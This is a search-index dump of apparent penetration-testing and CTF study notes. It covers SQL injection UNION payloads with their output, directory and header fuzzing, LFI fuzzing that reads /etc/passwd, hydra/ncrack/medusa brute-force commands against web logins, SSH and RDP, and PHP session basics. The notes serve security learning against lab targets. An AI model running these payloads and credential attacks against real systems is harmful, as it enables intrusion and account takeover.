INFORMATION_SCHEMA","type":1,"pageTitle":"SQL InjectionsqlmapINFORMATION_SCHEMAManual Methods","url":"docs/hunting/web/sql_injection#undefined","content":"search=killer' UNION SELECT SCHEMA_NAME,2,3,4,5,6 FROM INFORMATION_SCHEMA.SCHEMATA-- -  <h3>Search results </h3> ID: information_schema<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/><br/>ID: Staff<br/>Name: 2 3 <br/>Position: 4<br />Phone No: 5<br />Email: 6<br/><br/>ID: users<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/>  "},{"title":"all databases","type":1,"pageTitle":"SQL InjectionsqlmapINFORMATION_SCHEMAManual Methods","url":"docs/hunting/web/sql_injection#undefined","content":"search=killer' UNION SELECT GROUP_CONCAT(SCHEMA_NAME),2,3,4,5,6 FROM INFORMATION_SCHEMA.SCHEMATA-- -  <h3>Search results </h3> ID: information_schema,Staff,users<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/>  "},{"title":"Web ReconBasic ScanningDirectory ListingAuthenticationHeader Fuzzing and Manipulation","type":0,"sectionRef":"#","url":"docs/hunting/web/web_recon","content":""},{"title":"nmap","type":1,"pageTitle":"Web ReconBasic ScanningDirectory ListingAuthenticationHeader Fuzzing and Manipulation","url":"docs/hunting/web/web_recon#undefined","content":"https://github.com/jai-the-seeker/CTF-OSCP/blob/master/utilities/nmap.md#basic-scans "},{"title":"curl","type":1,"pageTitle":"Web ReconBasic ScanningDirectory ListingAuthenticationHeader Fuzzing and Manipulation","url":"docs/hunting/web/web_recon#undefined","content":"https://github.com/jai-the-seeker/CTF-OSCP/blob/master/utilities/curl.md#http-response-headers Directory Listing "},{"title":"Metasploit","type":1,"pageTitle":"Web ReconBasic ScanningDirectory ListingAuthenticationHeader Fuzzing and Manipulation","url":"docs/hunting/web/web_recon#undefined","content":"# bruteforce on web server directories and list the names of directories found using msfconsole use auxiliary/scanner/http/brute_dirs  "},{"title":"Dirb","type":1,"pageTitle":"Web ReconBasic ScanningDirectory ListingAuthenticationHeader Fuzzing and Manipulation","url":"docs/hunting/web/web_recon#undefined","content":"# DIRB IS a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by # launching a dictionary basesd attack against a web server and analizing the response. # Note: Please remember to remove the preceding ‘/’ from each of directory name entry (in the # directory.txt). Without this change, dirb won’t work. dirb http://192.166.161.3 directory.txt  "},{"title":"Using curl and bash script","type":1,"pageTitle":"Web ReconBasic ScanningDirectory ListingAuthenticationHeader Fuzzing and Manipulation","url":"docs/hunting/web/web_recon#undefined","content":"We can use curl to check for all the directories listed in the wordlist. This can be done by a following wrapper bash script https://github.com/jai-the-seeker/CTF-OSCP/blob/master/scripts/bash_scripts.md#directory-listing Authentication "},{"title":"Basic authentication","type":1,"pageTitle":"Web ReconBasic ScanningDirectory ListingAuthenticationHeader Fuzzing and Manipulation","url":"docs/hunting/web/web_recon#undefined","content":""},{"title":"Digest Authentication","type":1,"pageTitle":"Web ReconBasic ScanningDirectory ListingAuthenticationHeader Fuzzing and Manipulation","url":"docs/hunting/web/web_recon#undefined","content":"https://github.com/jai-the-seeker/CTF-OSCP/blob/master/utilities/curl.md#digest-authentication "},{"title":"Token Authentication","type":1,"pageTitle":"Web ReconBasic ScanningDirectory ListingAuthenticationHeader Fuzzing and Manipulation","url":"docs/hunting/web/web_recon#undefined","content":"Hydra and metasploit http_login module doesn’t support token authentication. We have to set the token in headers for token auth to work. curl -H 'Authorization: Token <token>' 192.183.171.3  We have to write a custom wrapper around this command. In the script, we will rely on the fact that on using the correct token, we will get something else than \"Unauthorized Access\". You can refer this script https://github.com/jai-the-seeker/CTF-OSCP/blob/master/scripts/bash_scripts.md#authorization-token After performing the dictionary attack we will get the password, which can be used to set the token in the headers # -H, --header <header/@file> Pass custom header(s) to server curl -H 'Authorization: Token 123123123' 192.186.248.3  "},{"title":"Hydra","type":1,"pageTitle":"Web ReconBasic ScanningDirectory ListingAuthenticationHeader Fuzzing and Manipulation","url":"docs/hunting/web/web_recon#undefined","content":""},{"title":"ncrack","type":1,"pageTitle":"Web ReconBasic ScanningDirectory ListingAuthenticationHeader Fuzzing and Manipulation","url":"docs/hunting/web/web_recon#undefined","content":"Refs: https://tools.kali.org/password-attacks/ncrackhttps://nmap.org/ncrack/man.html Use verbose mode (-v), read a list of IP addresses (-iL win.txt), and attempt to login with the username victim (--user victim) along with the passwords in a dictionary (-P passes.txt) using the RDP protocol (-p rdp) with a one connection at a time (CL=1): root@kali:~# ncrack -v -iL win.txt --user victim -P passes.txt -p rdp CL=1  "},{"title":"medusa","type":1,"pageTitle":"Web ReconBasic ScanningDirectory ListingAuthenticationHeader Fuzzing and Manipulation","url":"docs/hunting/web/web_recon#undefined","content":""},{"title":"Fetch Header","type":1,"pageTitle":"Web ReconBasic ScanningDirectory ListingAuthenticationHeader Fuzzing and Manipulation","url":"docs/hunting/web/web_recon#undefined","content":"# curl -I to fetch headers and read the protection type from those headers curl -I http://192.165.34.3/dir # msfconsole use auxiliary/scanner/http/http_header  "},{"title":"wfuzz","type":1,"pageTitle":"Web ReconBasic ScanningDirectory ListingAuthenticationHeader Fuzzing and Manipulation","url":"docs/hunting/web/web_recon#undefined","content":"Official Website https://wfuzz.readthedocs.io/en/latest/user/basicusage.html#fuzzing-paths-and-files There are two db wordlists associated with wfuzz which can be obtained from https://code.google.com/p/fuzzdb/https://github.com/danielmiessler/SecLists "},{"title":"curl","type":1,"pageTitle":"Web ReconBasic ScanningDirectory ListingAuthenticationHeader Fuzzing and Manipulation","url":"docs/hunting/web/web_recon#undefined","content":"https://github.com/jai-the-seeker/CTF-OSCP/blob/master/utilities/curl.md#http-basic-authentication "},{"title":"metasploit","type":1,"pageTitle":"Web ReconBasic ScanningDirectory ListingAuthenticationHeader Fuzzing and Manipulation","url":"docs/hunting/web/web_recon#undefined","content":"http_login module use auxiliary/scanner/http/http_login set RHOSTS 192.165.34.3 set USER_FILE /tmp/users set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt set VERBOSE false set AUTH_URI /poc/ exploit  "},{"title":"http-get","type":1,"pageTitle":"Web ReconBasic ScanningDirectory ListingAuthenticationHeader Fuzzing and Manipulation","url":"docs/hunting/web/web_recon#undefined","content":"This is the basic example hydra -L unix_users.txt -P passwords.txt 192.148.69.3 http-get /  Options : -l single LOGIN name or -L FILE having list of LOGIN names, -p single PASSWORD or -P FILE having list of passwords, -t Number of threads per target (default: 16) "},{"title":"http-post-form","type":1,"pageTitle":"Web ReconBasic ScanningDirectory ListingAuthenticationHeader Fuzzing and Manipulation","url":"docs/hunting/web/web_recon#undefined","content":"Ref https://redteamtutorials.com/2018/10/25/hydra-brute-force-https/https://www.youtube.com/watch?v=fFnEdoCyVhk&list=PLYmlEoSHldN7HJapyiQ8kFLUsk_a7EjCw&index=63 syntax hydra -L <USER> -P <Password> <IP Address> http-post-form \"<Login Page>:<Request Body>:<Error Message>\"  Example: hydra -L usernames.txt -P passwords.txt 192.168.2.62 http-post-form \"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed\"  "},{"title":"ssh","type":1,"pageTitle":"Web ReconBasic ScanningDirectory ListingAuthenticationHeader Fuzzing and Manipulation","url":"docs/hunting/web/web_recon#undefined","content":"hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.1.123 -t 4  "},{"title":"ssh","type":1,"pageTitle":"Web ReconBasic ScanningDirectory ListingAuthenticationHeader Fuzzing and Manipulation","url":"docs/hunting/web/web_recon#undefined","content":"ncrack -v -U username -P passwords CL=1 10.10.10.109:22 OR ncrack -v -U username -P passwords CL=1 ssh://10.10.10.109 OR ncrack -v -U username -P passwords CL=1 -p ssh 10.10.10.109  "},{"title":"ssh","type":1,"pageTitle":"Web ReconBasic ScanningDirectory ListingAuthenticationHeader Fuzzing and Manipulation","url":"docs/hunting/web/web_recon#undefined","content":"Ref https://www.youtube.com/watch?v=j0RjKrON8yI&list=PLPp1uf5KO-28BELlZoFyKNGDaMKZrriOr&index=74 medusa -h 192.168.1.102 -u msfadmin -P customwordlist.txt -M ssh -n 22  -h : target hostname, -u : username, -P : a dictionary file, -M : the module to execute like SSH, FTP etc, -n : port number wrt to module Header Fuzzing and Manipulation "},{"title":"Fuzzing User Agent String","type":1,"pageTitle":"Web ReconBasic ScanningDirectory ListingAuthenticationHeader Fuzzing and Manipulation","url":"docs/hunting/web/web_recon#undefined","content":"We can use wfuzz to check for various valid strings of the User-Agent by passing it a wordlist containing possible user agents strings. The word list can of user-agents can be obtained from https://github.com/fuzzdb-project/fuzzdb/blob/master/discovery/UserAgent/UserAgentListCommon.txt wfuzz -c -z file,user-agent.txt -H \"User-Agent: FUZZ\" http://192.8.221.3/secret  output  000001: C=200 1 L 2 W 39 Ch \"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6\" 000002: C=403 1 L 2 W 15 Ch \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\"  Here response code of 200 indicates that the user-agent-string is valid. The same can now be used with curl to verify and access the webpage curl -H \"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6\" 192.8.221.3/secret  "},{"title":"Fuzzing Missing Header","type":1,"pageTitle":"Web ReconBasic ScanningDirectory ListingAuthenticationHeader Fuzzing and Manipulation","url":"docs/hunting/web/web_recon#undefined","content":"Refs: https://rootflag.io/hack-the-box-control/ In case we see some message like Access Denied : Header Missing, it seems that it's expecting a certain header parameter. We can use wfuzz to try and determine what it might be looking for. So we can create a list of all the HTTP header responses from here. So we have some header types to fuzz now we just need our target. We were given a hint earlier that we had some files stored on a 192.168.4.28 address. We can generate a list of every IP in that scope and use that. This is what our total command will look like: Command: wfuzz -c -w http-headers-fuzz.txt -w ip-192-168-4-0.txt --hs \"Header Missing\" --sc \"200\" -H \"FUZZ:FUZ2Z\" \"http://10.10.10.167/admin.php\"  A quick breakdown of the above command: -c will output with colors, I like colors. -w specifies a wordlist. --hs will hide responses of the type following it. In this case \"Header Missing\". --sc will show response codes of the type following it. In this case 200. -H specifies header parameters. FUZZ:FUZ2Z These are the two header parameters we are fuzzing. FUZZ is for the first wordlist specified. FUZ2Z is for the second word list specified. So we have something like this in the header of our request: \"Acces-Control-Allow-Origin:192.168.4.44\" http://10.10.10.167/admin.php Lastly, the target URL. "},{"title":"Fuzzing Parameter for LFI","type":1,"pageTitle":"Web ReconBasic ScanningDirectory ListingAuthenticationHeader Fuzzing and Manipulation","url":"docs/hunting/web/web_recon#undefined","content":"Wordlist: https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt wfuzz -b 'PHPSESSID=asli2tadgik6dr33077orjr7oh' --hw 100 -c -w ~/Downloads/burp-parameter-names.txt http://10.10.10.109/manage.php?FUZZ=../../../../../../../../../../../../etc/passwd  Here, --hw 100 will hide responses with number of words less than 100, -b is for specifying the cookie for the request "},{"title":"bruteforcing","type":0,"sectionRef":"#","url":"docs/web_security/dvwa/bruteforcing","content":""},{"title":"hydra","type":1,"pageTitle":"bruteforcing","url":"docs/web_security/dvwa/bruteforcing#undefined","content":""},{"title":"http-get-form","type":1,"pageTitle":"bruteforcing","url":"docs/web_security/dvwa/bruteforcing#undefined","content":"Refs: https://youtu.be/3pSjwLbdxLAhttps://securitytutorials.co.uk/brute-forcing-web-logins-with-dvwa/ Typical layout of the command is as follows hydra -L <USER> -P <Password> <IP Address> http-post-form “<Login Page>:<Request parameters/body>:<Error Message>”  Lets, take a typical case of bruteforcing the dvwa app. Here, we are already logged-in. Therefore, we have to send the cookies along with our hydra command. In order to include cookies we use header tag H: hydra -L username1 -P password1 10.10.10.107 http-get-form '/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect:H:Cookie: security=low; PHPSESSID=aa324b92c3da5e8d7b63d594750ff63b'  We can also use following wordlists : usr/share/wordlists/metasploit/http_default_users.txtusr/share/wordlists/metasploit/http_default_pass.txt "},{"title":"Kill Sessions and Cookies","type":0,"sectionRef":"#","url":"docs/web_security/sessions","content":""},{"title":"In the begining","type":1,"pageTitle":"Kill Sessions and Cookies","url":"docs/web_security/sessions#undefined","content":"Let us create a php file for starting the session <?php session_start(); ?>  session_start() creates a session or resumes the current one based on a session identifier passed via a GET or POST request, or passed via a cookie. Once we open the file in the browser, we will see that a cookie named PHPSESSID is created  A session file is created in our server in the /tmp directory # ls /tmp sess_ca9f1b3ed05ab874e5d47ab522867ee3  "},{"title":"Capture traffic in Burpsuite","type":1,"pageTitle":"Kill Sessions and Cookies","url":"docs/web_security/sessions#undefined","content":"The first time we visit the webpage, raw request is given below GET /sess.php HTTP/1.1 Host: 10.10.10.105:5000 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1  When we visit the webpage again, we see that PHPSESSID cookie also travels along with the request GET /sess.php HTTP/1.1 Host: 10.10.10.105:5000 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: PHPSESSID=ca9f1b3ed05ab874e5d47ab522867ee3 Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0  "},{"title":"Play with Sessions","type":1,"pageTitle":"Kill Sessions and Cookies","url":"docs/web_security/sessions#undefined","content":"Let us set a few session variables, these are set with the PHP global variable $_SESSION. These variables can be accessed during lifetime of a session. <?php session_start(); if (isset($_SESSION['user'])) { echo \"Welcome :\". $_SESSION['user'].\"<br>\"; } else { $_SESSION['user'] = \"burp\"; } ?>  Now, when the user visits the webpage, an entry is made inside the sessions file in the server $ cat sess_ca9f1b3ed05ab874e5d47ab522867ee3 user|s:4:\"burp\";  The second and subsequent times, the user visits the webpage, \"Welcome :burp\" is displayed on the browser. "}]